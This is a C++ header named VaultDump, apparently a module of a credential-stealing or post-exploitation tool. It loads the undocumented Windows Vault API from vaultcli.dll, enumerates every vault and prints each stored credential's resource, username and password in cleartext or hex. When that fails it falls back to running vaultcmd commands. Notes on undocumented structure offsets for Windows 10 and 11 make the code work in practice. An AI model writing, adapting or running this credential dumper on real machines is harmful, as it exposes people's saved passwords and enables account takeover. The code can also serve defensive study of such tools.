#ifndef VAULT_DUMP_H
#define VAULT_DUMP_H

#include <windows.h>
#include <objbase.h>
#include <sddl.h>
#include <iostream>
#include <string>
#include <vector>
#include <array>
#include <cstdio>
#include <regex>
#include <sstream>
#include <iomanip>

namespace VaultDump {

    typedef enum _VAULT_ELEMENT_TYPE {
        ElementType_Boolean = 0,
        ElementType_Short,
        ElementType_UnsignedShort,
        ElementType_Integer,
        ElementType_UnsignedInteger,
        ElementType_Double,
        ElementType_Guid,
        ElementType_String,
        ElementType_ByteArray,
        ElementType_ProtectedArray,
        ElementType_Attribute,
        ElementType_Sid,
        ElementType_Max
    } VAULT_ELEMENT_TYPE;

    typedef struct _VAULT_BYTE_ARRAY {
        DWORD Length;
        PBYTE Data;
    } VAULT_BYTE_ARRAY, *PVAULT_BYTE_ARRAY;

    // NOTE: on Windows 10/11 the runtime layout differs from the MSDN
    // documentation. There are two DWORDs before Type. Observed layout:
    //   +0   DWORD unknown1
    //   +4   DWORD unknown2
    //   +8   VAULT_ELEMENT_TYPE Type
    //   +12  DWORD SchemaElementId
    //   +16  union
    #pragma pack(push, 8)
    typedef struct _VAULT_ITEM_ELEMENT {
        DWORD Unknown1;
        DWORD Unknown2;
        VAULT_ELEMENT_TYPE Type;
        DWORD SchemaElementId;
        union {
            BOOL             Boolean;
            SHORT            Short;
            USHORT           UnsignedShort;
            INT              Integer;
            UINT             UnsignedInteger;
            DOUBLE           Double;
            GUID             Guid;
            LPWSTR           String;
            VAULT_BYTE_ARRAY ByteArray;
            VAULT_BYTE_ARRAY ProtectedArray;
            DWORD            Attribute;
            PSID             Sid;
        };
    } VAULT_ITEM_ELEMENT, *PVAULT_ITEM_ELEMENT;
    #pragma pack(pop)

    #pragma pack(push, 8)
    typedef struct _VAULT_ITEM_WIN8 {
        GUID                 SchemaId;
        LPWSTR               pszCredentialFriendlyName;
        PVAULT_ITEM_ELEMENT  pResourceElement;
        PVAULT_ITEM_ELEMENT  pIdentityElement;
        PVAULT_ITEM_ELEMENT  pAuthenticatorElement;
        PVAULT_ITEM_ELEMENT  pPackageSid;
        FILETIME             LastModified;
        DWORD                dwFlags;
        DWORD                dwPropertiesCount;
        PVAULT_ITEM_ELEMENT  pProperties;
    } VAULT_ITEM_WIN8, *PVAULT_ITEM_WIN8;
    #pragma pack(pop)

    typedef DWORD (WINAPI *tVaultEnumerateVaults)(DWORD, DWORD*, GUID**);
    typedef DWORD (WINAPI *tVaultOpenVault)      (GUID*, DWORD, PVOID*);
    typedef DWORD (WINAPI *tVaultEnumerateItems) (PVOID, DWORD, DWORD*, PVOID**);
    typedef DWORD (WINAPI *tVaultCloseVault)     (PVOID*);
    typedef DWORD (WINAPI *tVaultFree)           (PVOID);

    inline std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1,
                                       nullptr, 0, nullptr, nullptr);
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1,
                            &result[0], size, nullptr, nullptr);
        return result;
    }

    inline std::string HexDump(const BYTE* data, DWORD size) {
        std::stringstream ss;
        for (DWORD i = 0; i < size; ++i) {
            ss << std::hex << std::setw(2) << std::setfill('0')
               << static_cast<int>(data[i]);
        }
        return ss.str();
    }

    inline std::wstring ExtractWString(PVAULT_ITEM_ELEMENT elem) {
        if (!elem) return L"";

        if (elem->Type == ElementType_String) {
            return elem->String ? elem->String : L"";
        }

        if (elem->Type == ElementType_ByteArray) {
            if (!elem->ByteArray.Data || elem->ByteArray.Length == 0) return L"";
            if (elem->ByteArray.Length % 2 == 0) {
                std::wstring result(
                    reinterpret_cast<wchar_t*>(elem->ByteArray.Data),
                    elem->ByteArray.Length / sizeof(wchar_t));
                while (!result.empty() && result.back() == L'\0') result.pop_back();
                return result;
            }
            return L"";
        }

        if (elem->Type == ElementType_ProtectedArray) {
            if (!elem->ProtectedArray.Data || elem->ProtectedArray.Length == 0) return L"";
            if (elem->ProtectedArray.Length % 2 == 0) {
                std::wstring result(
                    reinterpret_cast<wchar_t*>(elem->ProtectedArray.Data),
                    elem->ProtectedArray.Length / sizeof(wchar_t));
                while (!result.empty() && result.back() == L'\0') result.pop_back();
                return result;
            }
            return L"";
        }

        return L"";
    }

    inline bool DumpViaNativeApi() {
        std::cout << "\n=== Windows Vault (native API) ===\n";

        HMODULE hDll = LoadLibraryW(L"vaultcli.dll");
        if (!hDll) {
            std::cout << "[-] Could not load vaultcli.dll.\n";
            return false;
        }

        auto pVaultEnumerateVaults = (tVaultEnumerateVaults)GetProcAddress(hDll, "VaultEnumerateVaults");
        auto pVaultOpenVault       = (tVaultOpenVault)      GetProcAddress(hDll, "VaultOpenVault");
        auto pVaultEnumerateItems  = (tVaultEnumerateItems) GetProcAddress(hDll, "VaultEnumerateItems");
        auto pVaultCloseVault      = (tVaultCloseVault)     GetProcAddress(hDll, "VaultCloseVault");
        auto pVaultFree            = (tVaultFree)           GetProcAddress(hDll, "VaultFree");

        if (!pVaultEnumerateVaults || !pVaultOpenVault ||
            !pVaultEnumerateItems  || !pVaultCloseVault || !pVaultFree) {
            std::cout << "[-] Missing vault API exports.\n";
            FreeLibrary(hDll);
            return false;
        }

        DWORD vaultCount = 0;
        GUID* vaultGuids = nullptr;
        DWORD rc = pVaultEnumerateVaults(0, &vaultCount, &vaultGuids);
        if (rc != ERROR_SUCCESS) {
            std::cout << "[-] VaultEnumerateVaults failed: " << rc << "\n";
            FreeLibrary(hDll);
            return false;
        }

        std::cout << "[+] Enumerated " << vaultCount << " vault(s)\n";

        bool anyItem = false;

        for (DWORD i = 0; i < vaultCount; ++i) {
            wchar_t guidStr[64] = { 0 };
            StringFromGUID2(vaultGuids[i], guidStr, 64);

            std::cout << "\n--- Vault #" << (i + 1)
                      << " (GUID: " << WStringToString(guidStr) << ") ---\n";

            PVOID hVault = nullptr;
            rc = pVaultOpenVault(&vaultGuids[i], 0, &hVault);
            if (rc != ERROR_SUCCESS) {
                std::cout << "[-] VaultOpenVault failed: " << rc << "\n";
                continue;
            }

            DWORD itemCount = 0;
            PVAULT_ITEM_WIN8 items = nullptr;
            rc = pVaultEnumerateItems(hVault, 0x200, &itemCount, (PVOID**)&items);
            if (rc != ERROR_SUCCESS) {
                std::cout << "[-] VaultEnumerateItems failed: " << rc << "\n";
                pVaultCloseVault(&hVault);
                continue;
            }

            std::cout << "[+] Items: " << itemCount << "\n";

            for (DWORD j = 0; j < itemCount; ++j) {
                auto& item = items[j];
                anyItem = true;

                std::wstring friendly = item.pszCredentialFriendlyName
                                        ? item.pszCredentialFriendlyName
                                        : L"(unnamed)";
                std::wstring resource = ExtractWString(item.pResourceElement);
                std::wstring identity = ExtractWString(item.pIdentityElement);
                std::wstring password = ExtractWString(item.pAuthenticatorElement);

                std::cout << "\n  [" << (j + 1) << "] "
                          << WStringToString(friendly) << "\n";
                std::cout << "      Resource: " << WStringToString(resource) << "\n";
                std::cout << "      Identity: " << WStringToString(identity) << "\n";

                if (!password.empty()) {
                    std::cout << "      Password: " << WStringToString(password) << "\n";
                } else if (item.pAuthenticatorElement &&
                           item.pAuthenticatorElement->Type == ElementType_ByteArray &&
                           item.pAuthenticatorElement->ByteArray.Data &&
                           item.pAuthenticatorElement->ByteArray.Length > 0) {
                    std::cout << "      Password (hex): "
                              << HexDump(item.pAuthenticatorElement->ByteArray.Data,
                                         item.pAuthenticatorElement->ByteArray.Length)
                              << "\n";
                } else {
                    std::cout << "      Password: (not available)\n";
                }

                if (item.pPackageSid &&
                    item.pPackageSid->Type == ElementType_Sid &&
                    item.pPackageSid->Sid) {
                    LPWSTR sidStr = nullptr;
                    if (ConvertSidToStringSidW(item.pPackageSid->Sid, &sidStr)) {
                        std::cout << "      Package SID: "
                                  << WStringToString(sidStr) << "\n";
                        LocalFree(sidStr);
                    }
                }
            }

            pVaultFree(items);
            pVaultCloseVault(&hVault);
        }

        pVaultFree(vaultGuids);
        FreeLibrary(hDll);
        return anyItem;
    }

    inline std::string RunCommand(const std::string& cmd) {
        std::array<char, 4096> buffer;
        std::string result;
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) return "";
        while (fgets(buffer.data(), (int)buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
        _pclose(pipe);
        return result;
    }

    inline std::vector<std::string> ExtractVaultGuids(const std::string& output) {
        std::vector<std::string> guids;
        std::regex re(
            "\\{?([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-"
            "[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\\}?");
        auto begin = std::sregex_iterator(output.begin(), output.end(), re);
        auto end   = std::sregex_iterator();
        for (auto it = begin; it != end; ++it) {
            std::string guid = (*it)[1].str();
            bool seen = false;
            for (const auto& g : guids) {
                if (g == guid) { seen = true; break; }
            }
            if (!seen) guids.push_back(guid);
        }
        return guids;
    }

    inline std::string ExtractVaultName(const std::string& output,
                                        const std::string& guid) {
        size_t guidPos = output.find(guid);
        if (guidPos == std::string::npos) return "(unknown)";

        size_t lineStart = output.rfind('\n', guidPos);
        lineStart = (lineStart == std::string::npos) ? 0 : lineStart + 1;

        if (lineStart == 0) return "(unknown)";
        size_t prevEnd = lineStart - 1;
        size_t prevStart = output.rfind('\n', prevEnd);
        prevStart = (prevStart == std::string::npos) ? 0 : prevStart + 1;

        std::string prevLine = output.substr(prevStart, prevEnd - prevStart);

        size_t colon = prevLine.find(':');
        if (colon != std::string::npos) {
            std::string name = prevLine.substr(colon + 1);
            size_t s = name.find_first_not_of(" \t\r\n");
            size_t e = name.find_last_not_of(" \t\r\n");
            if (s != std::string::npos && e != std::string::npos) {
                return name.substr(s, e - s + 1);
            }
        }
        return "(unknown)";
    }

    inline void DumpViaVaultCmd() {
        std::cout << "\n=== Windows Vault (fallback: vaultcmd, metadata only) ===\n";

        std::string listOut = RunCommand("vaultcmd /list");
        if (listOut.empty()) {
            std::cout << "[-] vaultcmd /list produced no output.\n";
            return;
        }

        std::vector<std::string> guids = ExtractVaultGuids(listOut);
        if (guids.empty()) {
            std::cout << "[-] No vault GUIDs found.\n";
            return;
        }

        std::cout << "[+] Discovered " << guids.size() << " vault(s):\n";
        for (const auto& g : guids) {
            std::cout << "    - {" << g << "}  ("
                      << ExtractVaultName(listOut, g) << ")\n";
        }

        for (const auto& g : guids) {
            std::cout << "\n=== Vault: " << ExtractVaultName(listOut, g)
                      << " (GUID: {" << g << "}) ===\n";
            std::string cmd = "vaultcmd /listcreds:\"{" + g + "}\" /all";
            std::string out = RunCommand(cmd);
            if (out.empty()) {
                std::cout << "[-] No output.\n";
                continue;
            }
            std::cout << out;

            if (out.find("Invalid vault") != std::string::npos ||
                out.find("Nie mo") != std::string::npos) {
                std::cout << "[!] vaultcmd reported an invalid or empty vault.\n";
            }
        }
    }

    inline void Run() {
        bool success = DumpViaNativeApi();
        if (!success) {
            std::cout << "\n[i] Native Vault API returned no items; "
                         "falling back to vaultcmd.\n";
            DumpViaVaultCmd();
        }
    }
}

#endif